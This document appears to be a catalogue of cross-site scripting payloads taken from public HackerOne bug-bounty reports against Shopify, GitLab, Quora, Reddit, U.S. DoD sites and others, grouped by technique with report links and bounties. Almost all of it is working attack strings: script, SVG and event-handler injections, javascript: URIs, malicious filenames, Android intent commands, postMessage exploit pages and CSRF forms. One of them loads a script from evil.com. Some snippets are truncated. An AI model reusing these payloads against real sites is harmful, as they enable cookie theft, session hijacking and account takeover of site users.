— [Reflected XSS on a Atavist theme](https://hackerone.com/reports/947790) · Automattic · [bugra](https://hackerone.com/bugra)

### `9e30a7f6`

```
http://target.com/search?search=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

**Parameter:** `search`
— [Reflected XSS on a Atavist theme](https://hackerone.com/reports/947790) · Automattic · [bugra](https://hackerone.com/bugra)


## XSS via malicious filename containing <svg onload> in a file manager

### `e8119b36`

```
"><iframe src="malware_frame.html">
```

— [\[simple-server\] HTML with iframe element can be used as filename, which might lead to load and execute malicious JavaScript ](https://hackerone.com/reports/309641) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)

### `34c9ff99`

```
bash$ touch '"><svg onload=alert(3);>'
```

— [\[cloudcmd\] Stored XSS in the filename when directories listing](https://hackerone.com/reports/341044) · Node.js third-party modules · [tungpun](https://hackerone.com/tungpun)

### `5f500790`

```
"><svg onload=alert(3);>
```

— [\[cloudcmd\] Stored XSS in the filename when directories listing](https://hackerone.com/reports/341044) · Node.js third-party modules · [tungpun](https://hackerone.com/tungpun)


## XSS via SVG onload attribute

### `32067717`

```
<svg/onload=alert(document.cookie)>abcdef@test.com
```

— [stored xss in invited team member via email parameter](https://hackerone.com/reports/267177) · Shopify · [coldd](https://hackerone.com/coldd) · $500.0

### `43f839fb`

```
http://█████████/scripts/ctredirector.dll//?@_FILEhttp://target.com/%3Csvg/onload=confirm(document.cookie
```

**Parameter:** `@_FILE`
— [Corda Server XSS ████████](https://hackerone.com/reports/374057) · U.S. Dept Of Defense · [alyssa_herrera](https://hackerone.com/alyssa_herrera)

### `bbb681ce`

```
/><svg src=x onload=confirm(document.domain);>
```

— [stored xss in target.com](https://hackerone.com/reports/919859) · lemlist · [omarelfarsaoui](https://hackerone.com/omarelfarsaoui)


## Android intent extra injection of malicious HTML leading to XSS

### `ba729190`

```
adb shell
am start -n com.quora.android/com.quora.android.ActionBarContentActivity -e url 'http://test/test' -e html 'XSS<script>alert(123)</script>'
```

**Parameter:** `html`
— [\[Android\] XSS via start ContentActivity](https://hackerone.com/reports/189793) · Quora · [bobrov](https://hackerone.com/bobrov)

### `51124b66`

```
am start -n com.quora.android/com.quora.android.ActionBarContentActivity -e url 'http://test/test' -e html '<script src=//target.com></script>'
am start -n com.quora.android/com.quora.android.ContentActivity -e url 'http://test/test' -e html '<script src=//target.com></script>'
am start -n com.quora.android/com.quora.android.ModalContentActivity -e url 'http://test/test' -e html '<script src=//target.com></script>'
```

**Parameter:** `html`
— [\[Android\] XSS via start ContentActivity](https://hackerone.com/reports/189793) · Quora · [bobrov](https://hackerone.com/bobrov)


## Attribute injection by breaking out of a quoted attribute and adding an onclick handler

### `cc5ee822`

```
"><img src=x onerror=prompt(133)>
```

— [XSS at Bulk editing ProductVariants](https://hackerone.com/reports/72331) · Shopify · [mafia](https://hackerone.com/mafia) · $500.0

### `96ef5d47`

```
" onclick="alert(1)
```

— [http://target.com/search-results.html XSS](https://hackerone.com/reports/6344) · Khan Academy · [smiegles](https://hackerone.com/smiegles)


## Cross-site scripting via mermaid init configuration injection (fontFamily)

### `d879f4ee`

```
%%{init: { 'fontFamily': '\"></style><img src=x onerror=alert(document.cookie)>'} }%%
```

— [Stored DOM XSS via Mermaid chart](https://hackerone.com/reports/1103258) · GitLab · [taraszelyk](https://hackerone.com/taraszelyk) · $3,000.0

### `1ec47fbf`

```
%%{init: { 'fontFamily': '\"></style><img src=x onerror=alert(document.cookie)>'} }%%
sequenceDiagram
Alice->>Bob: Hi Bob
Bob->>Alice: Hi Alice
```

— [Stored DOM XSS via Mermaid chart](https://hackerone.com/reports/1103258) · GitLab · [taraszelyk](https://hackerone.com/taraszelyk) · $3,000.0


## CSRF POST delivering stored XSS via malicious hidden EVENT_DESCRIPTION field

### `d644c0c0`

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="█████" method="POST">
      <input type="hidden" name="EVENT&#95;DESCRIPTION" value="&lt;&#47;textarea&gt;&lt;input&gt;&lt;&#47;zzz&gt;&lt;zzz&gt;&lt;img&#47;src&#47;onerror&#61;print&#96;&#96;&gt;&lt;&#47;zzz&gt;" />
      <input type="hidden" name="YEARS&#95;OF&#95;EVENT" value="&lt;input&gt;" />
      <input type="hidden" name="EVENT&#95;WEB&#95;SITE" value="&lt;input&gt;" />
      <input type="hidden
```

**Parameter:** `EVENT_DESCRIPTION`
— [Cross-Site Scripting via 'EVENT_DESCRIPTION' parameter](https://hackerone.com/reports/3284381) · U.S. Dept Of Defense · [jonasdiasrebelo](https://hackerone.com/jonasdiasrebelo)

### `155878c1`

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="████████" method="POST">
      <input type="hidden" name="EVENT&#95;DESCRIPTION" value="1234" />
      <input type="hidden" name="YEARS&#95;OF&#95;EVENT" value="&lt;input&gt;" />
      <input type="hidden" name="EVENT&#95;WEB&#95;SITE" value="&lt;input&gt;" />
      <input type="hidden" name="ADMISSION&#95;FEE" value="&lt;input&gt;1234" />
      <input type="hidden" name="PARKING&#95;FEE" value="&lt;inpu
```

**Parameter:** `RAISED_FUNDS_DESC`
— [Cross-Site Scripting via 'RAISED_FUNDS_DESC' parameter](https://hackerone.com/reports/3284389) · U.S. Dept Of Defense · [jonasdiasrebelo](https://hackerone.com/jonasdiasrebelo)


## Data URI SVG with onload XSS via href attribute

### `31919e62`

```
<a href="data:data:image/svg+xml,%3Csvg xmlns='                          ' onload='alert(88)'%3E%3C/svg%3E">test 5</a>
```

— [Image queue default key of 'None' and GraphQL unhandled type exception](https://hackerone.com/reports/996041) · Reddit · [moblig](https://hackerone.com/moblig) · $500.0

### `aea71dc9`

```
<a xlink:href="data:image/svg+xml,%3Csvg xmlns='                          ' onload='alert(88)'%3E%3C/svg%3E">test 6</a>
```

— [Image queue default key of 'None' and GraphQL unhandled type exception](https://hackerone.com/reports/996041) · Reddit · [moblig](https://hackerone.com/moblig) · $500.0


## Details element injection with null byte and ontoggle event (XSS)

### `eafb0452`

```
https://██████████/███████████=███████"><details%00open%00ontoggle=alert()>
```

— [XSS on https://██████/███ via █████ parameter](https://hackerone.com/reports/1252059) · U.S. Dept Of Defense · [homosec](https://hackerone.com/homosec)

### `047f66cd`

```
Go to                                     "><details%00open%00ontoggle=alert()>
```

— [XSS on https://██████/███ via █████ parameter](https://hackerone.com/reports/1252059) · U.S. Dept Of Defense · [homosec](https://hackerone.com/homosec)


## DOM‑based XSS by injecting <img src=x onerror=alert()> into HTML via variable t

### `e330922e`

```
document.getElementsByTagName("div")[0].innerHTML=`<iframe srcdoc="<div lang=en ng-app=application ng-csp class=ng-scope>
<script src='https://target.com/recaptcha/about/js/main.min.js'></script>
<img src=x ng-on-error='w=$event.target.ownerDocument;a=w.defaultView.top.document.querySelector(&quot;[nonce]&quot;);b=w.createElement(&quot;script&quot;);b.src=&quot;//evil.com/hack.js&quot;;b.nonce=a.nonce;w.body.appendChild(b)'>
</div>
">`
```

— [CSP bypass on target.com using Google script resources](https://hackerone.com/reports/2279346) · PortSwigger Web Security · [joaxcar](https://hackerone.com/joaxcar) · $1,500.0

### `b07f5634`

```
line 1309 : n.html('"<u>' + t + '</u>"')                                                                   https://www.<img src=x onerror='alert()'>
```

**Parameter:** `t`
— [\[target.com\] Exploiting clickjacking vulnerability to trigger self DOM-based XSS](https://hackerone.com/reports/953579) · Automattic · [fuzzme](https://hackerone.com/fuzzme)


## DOM‑based XSS via JavaScript URI injection in URL

### `1551a8a4`

```
https://████████/██████=javascript:alert(document.domain)
```

— [DOM Based XSS on https://████ via backURL param](https://hackerone.com/reports/1159255) · U.S. Dept Of Defense · [nagli](https://hackerone.com/nagli)

### `777ca094`

```
https://█████/████=javascript:alert(document.domain)
```

— [DOM Based XSS on https://████ via backURL param](https://hackerone.com/reports/1159255) · U.S. Dept Of Defense · [nagli](https://hackerone.com/nagli)


## DOM XSS via postMessage JSON injection containing malicious HTML

### `f50bb7ea`

```
<html>
    <head>
        <title>XSS</title>
        
		<style>
			iframe
			{
				width: 100%;
				height: 100%;
				border: none;
			}
		</style>
    </head>
    <body>
        <iframe name="reveal" src="https://target.com" onload="xss()"></iframe>

        <script>
            var frame = window.frames.reveal
            
            function xss ()
            {
                frame.postMessage ('{"method":"addKeyBinding","args":[{"keyCode":666,"key":"Pwned","description":"<img src=x oner
```

— [\[reveal.js\] XSS by calling arbitrary method via postMessage](https://hackerone.com/reports/691977) · Node.js third-party modules · [s_p_q_r](https://hackerone.com/s_p_q_r)

### `3f9bebbb`

```
<script>
    var win = window.open ('https://target.com')
    
    function xss ()
    {
        win.postMessage ('{"method":"addKeyBinding","args":[{"keyCode":666,"key":"Pwned","description":"<img src=x onerror=alert(document.domain)>"}]}', '*')
        win.postMessage ('{"method":"toggleHelp"}', '*')
    }
    
    setTimeout (xss, 500)
</script>
```

— [\[reveal.js\] XSS by calling arbitrary method via postMessage](https://hackerone.com/reports/691977) · Node.js third-party modules · [s_p_q_r](https://hackerone.com/s_p_q_r)


## File‑name based XSS by creating a file whose name contains an <img onerror> payload

### `3ae6453b`

```
"><img src=x onerror=javascript:alert("xss")>"
```

**Parameter:** `filename`
— [\[flsaba\] Stored XSS in the file and directory name when directories listing](https://hackerone.com/reports/856588) · Node.js third-party modules · [d3lla](https://hackerone.com/d3lla)

### `b71ab2ad`

```
"><img src=x onerror=javascript:alert("xss2")>"
```

**Parameter:** `filename`
— [\[flsaba\] Stored XSS in the file and directory name when directories listing](https://hackerone.com/reports/856588) · Node.js third-party modules · [d3lla](https://hackerone.com/d3lla)


## Filename-based XSS via img onerror in unescaped file name

### `bf24572b`

```
"><img src="x" onerror=alert(cookie)>.png
```

— [Xss via Dropbox](https://hackerone.com/reports/72526) · ThisData · [blacksdawn](https://hackerone.com/blacksdawn)

### `d28037af`

```
4. in file upload upload any photo with payload file name : "><img src=x onerror=alert(document.cookie);.jpg
```

**Parameter:** `filename`
— [Reflected Cross-Site scripting in : target.com](https://hackerone.com/reports/1264832) · MTN Group · [alimanshester](https://hackerone.com/alimanshester)


## HTML attribute injection with onerror executing JavaScript (image XSS)

### `86aec4c2`

```
<img src="a:" onerror="var t=setTimeout;t(function(){var b=function(d){var x=new XMLHttpRequest;t(function(){eval(x.responseText)},2000);x.open('POST','https://target.com');x.send(d)};window.parent.postMessage(b(document.head.innerHTML),'*');},2000)"/>
```

— [XSS within Shopify Email App - Admin](https://hackerone.com/reports/869831) · Shopify · [imgnotfound](https://hackerone.com/imgnotfound)

### `7875a029`

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Trix Editor XSS Demo</title>
  <script src="https://target.com/npm/trix@2.1.8/dist/trix.umd.js"></script>
  <link href="https://target.com/npm/trix@2.1.1/dist/trix.min.css" rel="stylesheet">
</head>
<body>
  <h1>Trix Editor XSS Demo</h1>
  <trix-editor></trix-editor>
  <script>
  document.write(`copy<div data-trix-attachment="{&quot;contentType&quot;:&quot;text/html5&quot;,&quot;content&quot;:&quot;&lt;math&gt;
```

— [Mutation Based Stored XSS on Trix Editor version latest (2.1.8)](https://hackerone.com/reports/2819573) · Basecamp · [sudi](https://hackerone.com/sudi)


## HTML attribute injection using an onfocus event to achieve stored XSS

### `d015e427`

```
" onfocus="alert('Stored XSS in SEO Name field')"  autofocus="true"
```

**Parameter:** `seo_name`
— [Stored XSS in Pages SEO dialog Name field (concrete5 8.1.0)](https://hackerone.com/reports/230029) · Concrete CMS · [bl4de](https://hackerone.com/bl4de)

### `4e96e34a`

```
https://█████/██████=████%22%20o%3Cbr%3Enfocus=confirm(1337)%20autofocus%20tabindex=1%20xss
```

— [XSS on https://████/ via ███████ parameter](https://hackerone.com/reports/1251868) · U.S. Dept Of Defense · [homosec](https://hackerone.com/homosec)


## HTML attribute injection using quoted string to execute alert

### `ff9ff0ea`

```
"-alert(document.domain)-"
```

**Parameter:** `question`
— [XSS when clicking "Share to Twitter" at target.com/widgets/embed_iframe?path=...](https://hackerone.com/reports/258876) · Quora · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)

### `51d7cb7e`

```
Question ignore "-alert(document.domain)-"?
```

**Parameter:** `question`
— [XSS when clicking "Share to Twitter" at target.com/widgets/embed_iframe?path=...](https://hackerone.com/reports/258876) · Quora · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)


## HTML injection via an <iframe> tag leading to reflected XSS

### `d51324c6`

```
<iframe src=http://target.com/a/lz8DAkB/embed/embed?pub=true&ref=http%3A%2F%2Flocalhost%2Fembed.html&w=540></iframe>
```

— [self-xss with ClickJacking can leads to account takeover in Firefox](https://hackerone.com/reports/892289) · Imgur · [keer0k](https://hackerone.com/keer0k)

### `29f2cad0`

```
https://<iframe src="https://target.com/[ID_OF_TARGET]?tab=public_profile">
```

— [Self-XSS due to image URL can be eploited via XSSJacking techniques in review email](https://hackerone.com/reports/1397940) · Judge.me  · [penguinshelp](https://hackerone.com/penguinshelp)


## HTML injection with onerror attribute (XSS)

### `2e48c925`

```
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
```

— [Tinymce 2.4.0](https://hackerone.com/reports/262230) · Shopify · [jelmer](https://hackerone.com/jelmer) · $2,000.0

### `fdc9eb4b`

```
"><img src=a onerror=alert(1)>123@sdf.com
```

**Parameter:** `email`
— [Self xss in product reviews](https://hackerone.com/reports/1029668) · Shopify · [tomorrow_future](https://hackerone.com/tomorrow_future)


## HTML injection XSS using <iframe> tag with src attribute to load an external site

### `8607cbdf`

```
<iframe src="//target.com"></iframe>
```

— [Reflected XSS through multiple inputs in the issue collector on Jira](https://hackerone.com/reports/380354) · Roblox · [jackb898](https://hackerone.com/jackb898)

### `2a05e406`

```
<iframe src='//target.com'></iframe>
```

— [Reflected XSS through multiple inputs in the issue collector on Jira](https://hackerone.com/reports/380354) · Roblox · [jackb898](https://hackerone.com/jackb898)


## HTML tag injection using an <img> element

### `5aa06975`

```
<img>
```

— [Stored XSS on target.com and evil.com](https://hackerone.com/reports/87577) · Vimeo · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)

### `5ccde158`

```
<img src="//u00f1.xyz/xss.swf">
```

— [Stored XSS on target.com and evil.com](https://hackerone.com/reports/87577) · Vimeo · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)


## HTML tag injection (marquee) with onfinish event XSS via URL fragment

### `3b74c292`

```
https://███/help-leave/help/index.htm#rhsearch=%3Cmarquee%20loop=1%20onfinish=alert(document.domain)%3Etest%3C%2Fmarquee%3E&ux=search
```

— [HTML Injection leads to XSS on███](https://hackerone.com/reports/874228) · U.S. Dept Of Defense · [lemonoftroy](https://hackerone.com/lemonoftroy)

### `7a14f318`

```
https://█████/help-leave/help/index.htm#rhsearch=%3Cmarquee%3E%3Cu%3E%3Ca%20href%3D%22http%3A%2F%2Fevil.com%22%20onmouseover%3Dalert(document.domain)%3EXSS%20HACKERONE%20%2F%20lemonoftroy%3C%2Fa%3E%3C%2Fmarquee%3E&ux=search
```

— [HTML Injection leads to XSS on███](https://hackerone.com/reports/874228) · U.S. Dept Of Defense · [lemonoftroy](https://hackerone.com/lemonoftroy)


## Image tag injection with onerror handler (XSS)

### `8db26d8b`

```
https://█████/██████████<img%20src=x%20onerror=alert()>
```

— [XSS on https://████████/████' parameter](https://hackerone.com/reports/1252020) · U.S. Dept Of Defense · [homosec](https://hackerone.com/homosec)

### `42db3e83`

```
https://██████/███<img%20src=x%20onerror=alert()>
```

— [XSS on https://████████/████' parameter](https://hackerone.com/reports/1252020) · U.S. Dept Of Defense · [homosec](https://hackerone.com/homosec)


## Injecting a <script> tag via the Intent extra 'html' to achieve XSS in the Quora Android app

### `35a52209`

```
am start -n com.quora.android/com.quora.android.ModalContentActivity -e url 'http://test/test' -e html '<script>alert(QuoraAndroid.getClipboardData());</script>'
```

**Parameter:** `html`
— [\[Android\] XSS via start ContentActivity](https://hackerone.com/reports/189793) · Quora · [bobrov](https://hackerone.com/bobrov)

### `85ff67f3`

```
Intent i = new Intent();
i.setComponent(new ComponentName("com.quora.android","com.quora.android.ActionBarContentActivity"));
i.putExtra("url","http://test/test");
i.putExtra("html","XSS PoC <script>alert(123)</script>");
startActivity(i);
```

**Parameter:** `html`
— [\[Android\] XSS via start ContentActivity](https://hackerone.com/reports/189793) · Quora · [bobrov](https://hackerone.com/bobrov)


## JavaScript injection via unescaped __e2e_action_id parameter in JSON/JS context

### `1540d9ca`

```
...
 "js": "require('actions').finishAction('',alert(),'', {\"cont... "}, 
...
```

**Parameter:** `__e2e_action_id`
— [XSS through `__e2e_action_id` delivered by JSONP](https://hackerone.com/reports/259100) · Quora · [0xnan](https://hackerone.com/0xnan)

### `af0889dd`

```
__e2e_action_id=',alert(),'
```

**Parameter:** `__e2e_action_id`
— [XSS through `__e2e_action_id` delivered by JSONP](https://hackerone.com/reports/259100) · Quora · [0xnan](https://hackerone.com/0xnan)


## JavaScript prompt XSS payload

### `f6bcb4d8`

```
prompt(document.domain,document.cookie)
```

— [XSS on target.com without user interaction and evil.com with user interaction](https://hackerone.com/reports/96229) · Vimeo · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)

### `cbf38ce6`

```
prompt(document.domain, document.cookie)
```

— [XSS on target.com without user interaction and evil.com with user interaction](https://hackerone.com/reports/96229) · Vimeo · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)


## JavaScript URI in button href sent via postMessage leading to XSS

### `e5deaad3`

```
window.parent.postMessage(JSON.stringify({
  message: "Shopify.API.Bar.initialize",
  data: {
    buttons: {
      primary: {
        label: "Click here for XSS",
        href: "javascript:setTimeout('window.close()',1);window.opener.eval('alert(document.domain)');",
      }
    }
  }
}), "*");
```

**Parameter:** `href`
— [XSS in $shop$.target.com/admin/ via "Button Objects" in malicious app](https://hackerone.com/reports/217745) · Shopify · [bored-engineer](https://hackerone.com/bored-engineer) · $800.0

### `8ec148e7`

```
window.parent.postMessage(JSON.stringify({
  message: "Shopify.API.Modal.open",
  data: {
    src: "https://target.com",
    buttons: {
      primary: {
        label: "Click here for XSS",
        href: "javascript:setTimeout('window.close()',1);window.opener.eval('alert(document.domain)');",
      }
    }
  }
}), "*");
```

**Parameter:** `href`
— [XSS in $shop$.target.com/admin/ via "Button Objects" in malicious app](https://hackerone.com/reports/217745) · Shopify · [bored-engineer](https://hackerone.com/bored-engineer) · $800.0


## JavaScript URI injection (javascript:alert('XSS')) in the .gitmodules URL field

### `8b9ec9bf`

```
url = javascript:alert('XSS');
```

**Parameter:** `url`
— [Stored XSS on Files overview by abusing git submodule URL](https://hackerone.com/reports/218872) · GitLab · [jobert](https://hackerone.com/jobert)

### `e605dab4`

```
[code]javascript://%0dalert%28document.cookie%29[/code]
```

— [Stored XSS vulnerability in comments on *.target.com](https://hackerone.com/reports/707720) · Automattic · [poutine_hero](https://hackerone.com/poutine_hero)


## JavaScript‑URI XSS via `base_url` parameter using `javascript:` scheme

### `d25517f2`

```
pid=123&issue_type=1&base_url=javascript://alert(1)%3B@&summary={{title}}&description={{details_truncated}}+{{1+1}}+#{1+1}&labels=HackerOne&assignee=&custom=test=1
```

**Parameter:** `base_url`
— [IE 11 Self-XSS on Jira Integration Preview Base Link](https://hackerone.com/reports/212721) · HackerOne · [ziot](https://hackerone.com/ziot) · $750.0

### `ee9d6604`

```
javascript://alert(document.domain);%2f%2f@
```

**Parameter:** `base_url`
— [IE 11 Self-XSS on Jira Integration Preview Base Link](https://hackerone.com/reports/212721) · HackerOne · [ziot](https://hackerone.com/ziot) · $750.0


## JavaScript‑URI XSS via dest parameter

### `dcc52215`

```
https://target.com/?dest=javascript:alert(document.domain)
```

**Parameter:** `dest`
— [\[target.com\] Redirect parameter allows for XSS](https://hackerone.com/reports/1962645) · Reddit · [dvorakxl](https://hackerone.com/dvorakxl) · $5,000.0

### `e1cad3cf`

```
https://target.com/login/?dest=javascript:alert(document.domain
```

**Parameter:** `dest`
— [Regression on dest parameter sanitization doesn't check scheme/websafe destinations](https://hackerone.com/reports/1962951) · Reddit · [mrzheev](https://hackerone.com/mrzheev) · $500.0


## JavaScript URI XSS via google_apps_uri parameter

### `291ac753`

```
https://target.com/services/login/identity?destination_uuid=79b5c315-b5ac-4b19-bd33-13554433fa31&google_apps_uri=javascript:prompt(document.domain
```

**Parameter:** `google_apps_uri`
— [XSS while logging using Google](https://hackerone.com/reports/691611) · Shopify · [ashketchum](https://hackerone.com/ashketchum) · $1,750.0

### `e871d0b0`

```
https://target.com/services/login/identity?destination_uuid=79b5c315-b5ac-4b19-bd33-13554433fa31&google_apps_uri=javascript:prompt(document.cookie
```

**Parameter:** `google_apps_uri`
— [XSS while logging using Google](https://hackerone.com/reports/691611) · Shopify · [ashketchum](https://hackerone.com/ashketchum) · $1,750.0


## JavaScript‑URI XSS injected into the Project URL field

### `c77f3d69`

```
javascript:alert("Current user its API token: " + window.gon.api_token);
```

— [Persistent XSS on public project page](https://hackerone.com/reports/129736) · GitLab · [jobert](https://hackerone.com/jobert)

### `68e64f01`

```
<style>

div {
       position:absolute;
       top:200px;
       left:900px;
       
   }
 body {

 	background-image: url('1.png');
 	background-repeat: no-repeat;
 	background-position: 300px 5px;

 }
</style>

<iframe src="https://███████?URL=javascript:alert(document.domain)//%0D%0A&#x22;https://target.com" id="xxx" width=100% height=100% style="opacity: 0;"></iframe>
```

**Parameter:** `src`
— [Reflected XSS through ClickJacking](https://hackerone.com/reports/1171403) · U.S. Dept Of Defense · [sazouki](https://hackerone.com/sazouki)


## JavaScript URI XSS via location assignment

### `865df067`

```
'javascript:alert\x28\x29'
```

**Parameter:** `location`
— [XSS \[flow\] - on target.com/paypalme/my/landing (requires user interaction)](https://hackerone.com/reports/425200) · PayPal · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)

### `54d4c7d0`

```
location='javascript:alert\x28\x29'
```

— [XSS \[flow\] - on target.com/paypalme/my/landing (requires user interaction)](https://hackerone.com/reports/425200) · PayPal · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)


## JavaScript‑URI XSS via redirect parameter (alert(document.cookie))

### `c42e5726`

```
https://█████/sec.html?redirect=javascript:alert(document.cookie
```

**Parameter:** `redirect`
— [Reflected xss on https://█████████](https://hackerone.com/reports/1988560) · U.S. Dept Of Defense · [rektile404](https://hackerone.com/rektile404)

### `2b365fa8`

```
https://█████████/sec.html?redirect=javascript:alert(1
```

**Parameter:** `redirect`
— [Reflected xss on https://█████████](https://hackerone.com/reports/1988560) · U.S. Dept Of Defense · [rektile404](https://hackerone.com/rektile404)


## JavaScript URI XSS via return_url parameter (open redirect)

### `61f62d7a`

```
https://localhost/-/jira_connect/users?return_to=javascript:alert(location)
```

**Parameter:** `return_to`
— [XSS by clicking Jira's link](https://hackerone.com/reports/1194254) · GitLab · [ooooooo_q](https://hackerone.com/ooooooo_q) · $1,130.0

### `1c509d3a`

```
http://target.com/community?return_url=javascript:alert(1
```

**Parameter:** `return_url`
— [Open redirect and reflected xss in http://target.com/community?return_url=\[payload her\]](https://hackerone.com/reports/50379) · Adobe · [nijagaw](https://hackerone.com/nijagaw)


## JSONP XSS via callback parameter injection (alert)

### `52976fab`

```
http://target.com/newswire/tags#/?tags=\%2e%2e\%2e%2e\%2e%2e\comments_dal\users\getGlobalLoginSettings%2ejson?callback=alert(%2fxss%2f);%2f%2f
```

**Parameter:** `callback`
— [DOM based reflected XSS in target.com/newswire/tags through cross domain ajax request](https://hackerone.com/reports/172843) · Rockstar Games · [zombiehelp54](https://hackerone.com/zombiehelp54)

### `f57baad7`

```
?callback=alert(/xss/);//
```

**Parameter:** `callback`
— [DOM based reflected XSS in target.com/newswire/tags through cross domain ajax request](https://hackerone.com/reports/172843) · Rockstar Games · [zombiehelp54](https://hackerone.com/zombiehelp54)


## Reflected XSS via CSS animation event handler injection in utm_source parameter

### `58861217`

```
https://target.com/markets?utm_source=INJECTION%22%20style=%22animation-name:swoop-up%22%20onanimationstart=%22alert(document.domain)
```

**Parameter:** `utm_source`
— [XSS in target.com/markets?utm_source=](https://hackerone.com/reports/1699762) · Shopify · [noblesix](https://hackerone.com/noblesix)

### `328e22e7`

```
injection%22%20style=%22animation-name:swoop-up%22%20onanimationstart=%22alert(document.domain)
```

**Parameter:** `utm_source`
— [XSS in target.com/markets?utm_source=](https://hackerone.com/reports/1699762) · Shopify · [noblesix](https://hackerone.com/noblesix)


## Reflected XSS via the 'CurrentFolder' query parameter injecting an <img> onerror payload

### `ac0500ea`

```
https://██████/landpower/resources.aspx?Directory=/20/&ParentID=27&CurrentFolder=%3Cimg%20src%20onerror=alert(domain
```

**Parameter:** `CurrentFolder`
— [\[████████\] RXSS via "CurrentFolder" parameter](https://hackerone.com/reports/1624267) · U.S. Dept Of Defense · [qu1nten](https://hackerone.com/qu1nten)

### `ffbe1b45`

```
https://██████████/landpower/resources.aspx?Directory=/20/&ParentID=27&CurrentFolder=%3Cimg%20src%20onerror=alert(domain
```

**Parameter:** `CurrentFolder`
— [\[████████\] RXSS via "CurrentFolder" parameter](https://hackerone.com/reports/1624267) · U.S. Dept Of Defense · [qu1nten](https://hackerone.com/qu1nten)


## Reflected XSS via HTML injection using an <iframe onload> attribute in the q query parameter

### `a39ec805`

```
https://target.com/attendees/featured-attendees?q=rubyoob%27%3E%3Ciframe/onload=alert\(document.domain\
```

**Parameter:** `q`
— [Reflected xss on target.com](https://hackerone.com/reports/166699) · WebSummit · [rubyroobs](https://hackerone.com/rubyroobs)

### `abd6ee96`

```
https://██████/images.ashx?loc=%3C/div%3E%3Cimg%20src=%22target.com%22%20onerror=alert(%22TestingXSS%22
```

**Parameter:** `loc`
— [Content-Injection/XSS ████](https://hackerone.com/reports/205360) · U.S. Dept Of Defense · [c0rte](https://hackerone.com/c0rte)


## Reflected XSS via injection of closing tag and <h1> in URL path

### `f7cf84d5`

```
"><h1>XSS here
```

— [Reflected XSS on target.com](https://hackerone.com/reports/179426) · Blockchain · [kasperkarlsson](https://hackerone.com/kasperkarlsson)

### `e07812dc`

```
"><marquee>XSS here
```

— [Reflected XSS on target.com](https://hackerone.com/reports/179426) · Blockchain · [kasperkarlsson](https://hackerone.com/kasperkarlsson)


## Reflected XSS via a malicious SVG onload attribute embedded in the URL path

### `5b9fab44`

```
https://███████████████%3CSvg%20OnLoad=alert(1
```

— [Reflected XSS In https://███████](https://hackerone.com/reports/1094276) · U.S. Dept Of Defense · [sleepnotf0und](https://hackerone.com/sleepnotf0und)

### `3ba1ae0c`

```
https://██████████████████%3CSvg%20OnLoad=alert(1
```

— [Reflected XSS In https://███████](https://hackerone.com/reports/1094276) · U.S. Dept Of Defense · [sleepnotf0und](https://hackerone.com/sleepnotf0und)


## Reflected XSS using a malicious URL parameter

### `2c035c5a`

```
http://█████/?██████=%27;}alert(%22chron0x%22);%20function%20clickit(){//
```

— [Reflected XSS on █████████](https://hackerone.com/reports/1059395) · U.S. Dept Of Defense · [0x0d0](https://hackerone.com/0x0d0)

### `b020ac28`

```
);>.html                                                                        http://██████████.target.com/"><img+src=z+onerror=console.log(
```

— [Stored XSS on the "target.com/extras-widgets" url at "Recent comments by" module with malicious blog url](https://hackerone.com/reports/1083734) · Automattic · [superpan](https://hackerone.com/superpan)


## Reflected XSS via onload attribute injection in URL path

### `55edb077`

```
https://██████████/███onload=%22prompt(1)
```

**Parameter:** `path`
— [XSS Reflected - ██████████](https://hackerone.com/reports/1223577) · U.S. Dept Of Defense · [drauschkolb](https://hackerone.com/drauschkolb)

### `040d3058`

```
https://████████/██████onload=%22prompt(1
```

**Parameter:** `path`
— [XSS Reflected - ██████████](https://hackerone.com/reports/1223577) · U.S. Dept Of Defense · [drauschkolb](https://hackerone.com/drauschkolb)


## Reflected XSS via onmouseover attribute injection in URL parameter p

### `68998df4`

```
https://target.com/form.html?uid=1&p=%27%20onmouseover=alert(document.domain
```

**Parameter:** `p`
— [\[target.com\] DOM based XSS at form.html](https://hackerone.com/reports/158484) · Ubiquiti Inc. · [s_p_q_r](https://hackerone.com/s_p_q_r)

### `047abe40`

```
>                                                                                       '%20onmouseover=alert('jarvis7')%20'
```

**Parameter:** `rcnum`
— [\[█████\] Reflected GET XSS  (/personnel.php?...&rcnum=*) with mouse action](https://hackerone.com/reports/648348) · U.S. Dept Of Defense · [jarvis0x1](https://hackerone.com/jarvis0x1)


## Reflected XSS via onmouseover injection in the "lang_id" query parameter

### `af54bc45`

```
https://target.com/icecream/?lang_id=5%22%20onmouseover%3dprompt(document.domain
```

**Parameter:** `lang_id`
— [XSS At "target.com"](https://hackerone.com/reports/156098) · Uber · [raghav_bisht](https://hackerone.com/raghav_bisht)

### `32209cb2`

```
https://target.com/icecream/?lang_id=5%22%20onmouseover%3dprompt(document.cookie
```

**Parameter:** `lang_id`
— [XSS At "target.com"](https://hackerone.com/reports/156098) · Uber · [raghav_bisht](https://hackerone.com/raghav_bisht)


## Reflected XSS payload injecting an <img> tag in POST data

### `260c6918`

```
Post data: "><img src="                    >/zomato.php?c=zomato_xss" />
```

— [\[target.com\] Blind XSS in one of the admin dashboard](https://hackerone.com/reports/461272) · Eternal · [nguyenlv7](https://hackerone.com/nguyenlv7) · $500.0

### `577eaae5`

```
"><img src=1 onerror=alert(document.domain)>
```

— [Stored XSS in the banner block description](https://hackerone.com/reports/1065964) · Stripo Inc · [solov9ev](https://hackerone.com/solov9ev)


## Reflected XSS via SiteName query parameter

### `71a2a4e9`

```
https://█████████/Pages/default.aspx?FollowSite=0&SiteName=%27-confirm(%27XSSALERT%27
```

**Parameter:** `SiteName`
